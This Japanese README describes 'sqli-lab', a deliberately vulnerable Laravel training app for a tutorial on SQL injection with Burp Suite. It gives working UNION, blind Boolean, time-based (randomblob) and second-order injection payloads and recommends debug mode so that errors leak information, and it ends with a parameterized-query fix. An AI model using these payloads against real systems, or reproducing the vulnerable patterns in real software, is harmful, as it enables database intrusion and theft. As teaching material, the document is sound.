# sqli-lab

Zenn 記事「Burp Suite で学ぶ SQL インジェクション入門」用の教材やられアプリ。
Laravel 12 + SQLite で構築されており、**意図的に SQL インジェクション脆弱性を含んでいます**。

> ⚠️ **警告**: 教育目的で意図的に脆弱に作られています。**絶対に本番環境やインターネットに公開された環境にデプロイしないでください**。ローカル (`127.0.0.1`) でのみ動かすことを想定しています。

## 学習できる攻撃手法

| 画面 | 攻撃手法 |
|---|---|
| `GET /search` | UNION-based SQLi / Boolean-based Blind / Time-based Blind |
| `GET\|POST /register` → `GET /profile/{id}` | Second-order SQLi |

- **UNION-based**: カラム数特定 → `sqlite_version()` → `sqlite_master` からスキーマ抽出
- **Boolean-based Blind**: `AND 1=1` / `AND 1=2` のレスポンス差分で情報抽出
- **Time-based Blind**: SQLite には `SLEEP` がないため `randomblob(N)` で遅延を再現
- **Second-order**: `/register` で保存したペイロードが `/profile/{id}` の別クエリで発火

詳細な攻撃シナリオは [`docs/DESIGN.md`](docs/DESIGN.md) を参照してください。

## 技術スタック

- PHP 8.2+
- Laravel 12
- SQLite
- Blade + Tailwind CDN（ビルド不要）

## セットアップ

```bash
git clone https://github.com/sugarless1101/SQLi-LAB.git
cd SQLi-LAB
composer install
cp .env.example .env
php artisan key:generate
touch database/database.sqlite
php artisan migrate --seed
php artisan serve
```

`http://127.0.0.1:8000` にアクセスすると `/search` にリダイレクトされます。

### `.env` の推奨設定

```
APP_DEBUG=true
DB_CONNECTION=sqlite
DB_DATABASE=database/database.sqlite
SESSION_DRIVER=file
CACHE_STORE=file
QUEUE_CONNECTION=sync
```

`APP_DEBUG=true` にしておくと SQL エラー時に詳細画面が出て、エラーメッセージから情報を抜く演習ができます。

### DB をリセットしたいとき

```bash
php artisan migrate:fresh --seed
```

## 攻撃ペイロード例

### UNION-based（`/search`）

```
# カラム数 (7) と表示位置を特定
x%' UNION SELECT 1,2,3,4,5,6,7 --

# SQLite バージョン取得
x%' UNION SELECT 1,2,sqlite_version(),4,5,6,7 --

# テーブル一覧取得
x%' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master WHERE type='table' --
```

### Blind SQLi（`/search`）

```
# Boolean-based: 結果の有無で真偽判定
%' AND 1=1 --
%' AND 1=2 --

# Time-based: 遅延で真偽判定
%' AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 1 END --
```

### Second-order SQLi（`/register` → `/profile/{id}`）

`/register` の `username` フィールドに以下を入力:

```
admin'' OR ''1''=''1
```

シングルクォートを 2 個ずつ書くのは、vulnerable INSERT が文字列リテラル内で
値を結合するため。そのまま `admin' OR '1'='1` を送ると SQL 構文上の問題で
意図どおりには保存されない。DB には `admin' OR '1'='1` として保存される。

登録後に表示される `/profile/{id}` へアクセスすると:

```sql
SELECT * FROM posts WHERE author = 'admin' OR '1'='1'
```

として展開され、`posts` テーブル全件が返却されます。

## ディレクトリ構成

```
sqli-lab/
├── CLAUDE.md                          # プロジェクト設計方針（Claude Code 用）
├── docs/DESIGN.md                     # 詳細設計書（ER 図・攻撃シナリオ）
├── app/Http/Controllers/
│   ├── SearchController.php           # UNION / Blind SQLi 対象
│   ├── RegisterController.php         # Second-order SQLi 入口
│   └── ProfileController.php          # Second-order SQLi 発火点
├── database/
│   ├── migrations/
│   │   ├── 2026_04_15_000001_create_products_table.php
│   │   ├── 2026_04_15_000002_create_users_table.php
│   │   └── 2026_04_15_000003_create_posts_table.php
│   └── seeders/
│       ├── ProductSeeder.php
│       └── PostSeeder.php
├── resources/views/
│   ├── layouts/app.blade.php
│   ├── search.blade.php
│   ├── register.blade.php
│   └── profile.blade.php
└── routes/web.php
```

脆弱箇所には必ず `// VULNERABLE: <理由>` コメントが付いているので、grep すると演習対象クエリを一覧できます:

```bash
grep -rn "VULNERABLE:" app/
```

## 対策の例

記事の後半で「正しい実装」として紹介する安全な書き方:

```php
$results = DB::select(
    "SELECT * FROM products WHERE name LIKE ?",
    ['%' . $keyword . '%']
);
```

プレースホルダを使えば UNION / Blind / Second-order いずれも成立しません。

## ライセンス

教材用のためライセンス未指定です。記事に伴う学習以外の用途での再配布は想定していません。
